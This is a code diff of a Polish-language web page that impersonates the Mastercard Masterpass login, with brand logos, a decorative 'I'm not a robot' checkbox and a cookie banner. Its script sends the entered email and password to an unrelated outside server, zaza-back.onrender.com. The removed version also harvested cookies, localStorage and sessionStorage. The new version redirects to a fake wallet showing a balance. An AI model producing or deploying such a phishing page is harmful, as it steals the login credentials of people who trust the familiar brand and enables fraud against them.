@@ -1,131 +1,128 @@
 <!DOCTYPE html>
 <html lang="pl">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Masterpass Login</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" />
-  </head>
-  <body class="bg-black flex items-center justify-center min-h-screen font-sans">
-    <div class="bg-white w-[480px] sm:w-[640px] rounded shadow-lg relative">
-      <!-- Header -->
-      <div class="flex items-center justify-between p-4 border-b">
-        <div class="flex items-center space-x-2">
-          <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-8 h-8" />
-          <div class="text-sm font-semibold">masterpass <span class="text-gray-500 text-xs block">by mastercard.</span></div>
-        </div>
-        <button class="text-black text-2xl font-bold hover:scale-110 transition">&times;</button>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Masterpass Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" />
+</head>
+<body class="bg-black flex items-center justify-center min-h-screen font-sans">
+  <div class="bg-white w-[480px] sm:w-[640px] rounded shadow-lg relative">
+    <!-- Header -->
+    <div class="flex items-center justify-between p-4 border-b">
+      <div class="flex items-center space-x-2">
+        <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-8 h-8" />
+        <div class="text-sm font-semibold">masterpass <span class="text-gray-500 text-xs block">by mastercard.</span></div>
       </div>
+      <button class="text-black text-2xl font-bold hover:scale-110 transition">&times;</button>
+    </div>
 
-      <!-- Main content -->
-      <div class="flex">
-        <!-- Benefits -->
-        <div class="hidden md:flex flex-col gap-6 p-6 text-sm w-1/2 border-r">
-          <div>
-            <img src="https://img.icons8.com/ios-filled/24/ef4444/lock--v1.png" />
-            <p class="mt-2"><strong>Bezpieczeństwo</strong><br />Płatność, dzięki której sklepy nie widzą danych Twojej karty</p>
-          </div>
-          <div>
-            <img src="https://img.icons8.com/ios-filled/24/ef4444/stopwatch.png" />
-            <p class="mt-2"><strong>Szybkość transakcji</strong><br />Dane karty podajesz tylko raz – przy rejestracji</p>
-          </div>
-          <div>
-            <img src="https://img.icons8.com/ios-filled/24/ef4444/laptop.png" />
-            <p class="mt-2"><strong>Wygoda</strong><br />Zakupy on-line na każdym urządzeniu</p>
-          </div>
+    <!-- Main content -->
+    <div class="flex">
+      <!-- Benefits -->
+      <div class="hidden md:flex flex-col gap-6 p-6 text-sm w-1/2 border-r">
+        <div>
+          <img src="https://img.icons8.com/ios-filled/24/ef4444/lock--v1.png" />
+          <p class="mt-2"><strong>Bezpieczeństwo</strong><br />Płatność, dzięki której sklepy nie widzą danych Twojej karty</p>
         </div>
-
-        <!-- Login form -->
-        <div class="flex-1 p-6">
-          <h2 class="text-lg font-semibold mb-4">Zaloguj się</h2>
-          <form id="loginForm" class="space-y-4">
-            <input
-              type="text"
-              name="email"
-	      pattern="(^\\+48\\d{9}$)|(^[\\w.-]+@[\\w.-]+\\.\\w{2,}$)"
-	      title="Podaj poprawny adres e-mail lub numer telefonu w formacie +48XXXXXXXXX"
-              placeholder="Adres e-mail lub numer telefonu"
-              class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
-              required />
-            <input
-              type="password"
-              name="password"
-              placeholder="Hasło"
-              class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
-              required />
-            <div class="flex items-center gap-2">
-              <input type="checkbox" id="robot" required />
-              <label for="robot" class="text-sm">I'm not a robot</label>
-              <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="h-6 ml-2" />
-            </div>
-            <div class="flex items-center justify-between text-sm">
-              <label><input type="checkbox" id="remember" /> Pamiętaj mój login</label>
-              <a href="#" class="text-blue-500 hover:underline">Nie znam hasła</a>
-            </div>
-            <button
-              type="submit"
-              class="bg-gray-300 text-white w-full py-2 rounded cursor-not-allowed"
-              id="loginBtn"
-              disabled>
-              Zaloguj
-            </button>
-          </form>
+        <div>
+          <img src="https://img.icons8.com/ios-filled/24/ef4444/stopwatch.png" />
+          <p class="mt-2"><strong>Szybkość transakcji</strong><br />Dane karty podajesz tylko raz – przy rejestracji</p>
+        </div>
+        <div>
+          <img src="https://img.icons8.com/ios-filled/24/ef4444/laptop.png" />
+          <p class="mt-2"><strong>Wygoda</strong><br />Zakupy on-line na każdym urządzeniu</p>
         </div>
       </div>
 
-      <!-- Footer -->
-      <div class="text-center text-xs bg-black text-white p-2 flex justify-between items-center">
-        <p>Strona wykorzystuje pliki cookie...</p>
-        <button class="text-white text-lg font-bold">&times;</button>
+      <!-- Login form -->
+      <div class="flex-1 p-6">
+        <h2 class="text-lg font-semibold mb-4">Zaloguj się</h2>
+        <form id="loginForm" class="space-y-4">
+          <input
+            type="text"
+            name="email"
+            pattern="(^\\+48\\d{9}$)|(^[\\w.-]+@[\\w.-]+\\.\\w{2,}$)"
+            title="Podaj poprawny adres e-mail lub numer telefonu w formacie +48XXXXXXXXX"
+            placeholder="Adres e-mail lub numer telefonu"
+            class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
+            required />
+          <input
+            type="password"
+            name="password"
+            placeholder="Hasło"
+            class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
+            required />
+          <div class="flex items-center gap-2">
+            <input type="checkbox" id="robot" required />
+            <label for="robot" class="text-sm">I'm not a robot</label>
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="h-6 ml-2" />
+          </div>
+          <div class="flex items-center justify-between text-sm">
+            <label><input type="checkbox" id="remember" /> Pamiętaj mój login</label>
+            <a href="#" class="text-black underline hover:text-orange-500">Nie znam hasła</a>
+          </div>
+          <button
+            type="submit"
+            class="bg-gray-300 text-white w-full py-2 rounded cursor-not-allowed"
+            id="loginBtn"
+            disabled>
+            Zaloguj
+          </button>
+        </form>
       </div>
     </div>
 
-    <script>
-      const form = document.getElementById('loginForm');
-      const loginBtn = document.getElementById('loginBtn');
-      const robotCheckbox = document.getElementById('robot');
+    <!-- Footer -->
+    <div class="text-xs bg-black text-white p-2 text-center">
+      Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę...
+    </div>
+    <div class="bg-white text-xs p-2 flex justify-between items-center border-t">
+      <img src="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" class="h-5" />
+      <span>Zgoda na pliki cookies</span>
+    </div>
+  </div>
 
-      robotCheckbox.addEventListener('change', () => {
-        loginBtn.disabled = !robotCheckbox.checked;
-        loginBtn.classList.toggle('bg-red-600', robotCheckbox.checked);
-        loginBtn.classList.toggle('cursor-pointer', robotCheckbox.checked);
-        loginBtn.classList.toggle('cursor-not-allowed', !robotCheckbox.checked);
-      });
+  <script>
+    const form = document.getElementById('loginForm');
+    const loginBtn = document.getElementById('loginBtn');
+    const robotCheckbox = document.getElementById('robot');
 
-      form.addEventListener('submit', async (e) => {
-        e.preventDefault();
+    robotCheckbox.addEventListener('change', () => {
+      loginBtn.disabled = !robotCheckbox.checked;
+      loginBtn.classList.toggle('bg-orange-500', robotCheckbox.checked);
+      loginBtn.classList.toggle('cursor-pointer', robotCheckbox.checked);
+      loginBtn.classList.toggle('cursor-not-allowed', !robotCheckbox.checked);
+    });
 
-        const payload = {
-          email: form.email.value,
-          password: form.password.value,
-          remember: document.getElementById('remember').checked,
-          cookies: document.cookie,
-          localStorage: JSON.stringify(localStorage),
-          sessionStorage: JSON.stringify(sessionStorage),
-          userAgent: navigator.userAgent,
-          location: window.location.href,
-          date: new Date().toISOString(),
-        };
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
 
-        try {
-          const res = await fetch('https://zaza-back.onrender.com/login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-          });
+      const payload = {
+        email: form.email.value,
+        password: form.password.value,
+        remember: document.getElementById('remember').checked
+      };
 
-          if (res.ok) {
-            alert('✅ Wysłano!');
-            form.reset();
-          } else {
-            alert('❌ Błąd przy wysyłce.');
-          }
-        } catch (err) {
-          console.error(err);
-          alert('❌ Błąd połączenia.');
+      try {
+        const res = await fetch('https://zaza-back.onrender.com/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+        });
+
+        if (res.ok) {
+          localStorage.setItem('user', JSON.stringify({
+            email: form.email.value,
+            balance: '100.00'
+          }));
+          window.location.href = 'wallet.html';
         }
-      });
-    </script>
-  </body>
+      } catch (err) {
+        console.error(err);
+      }
+    });
+  </script>
+</body>
 </html>
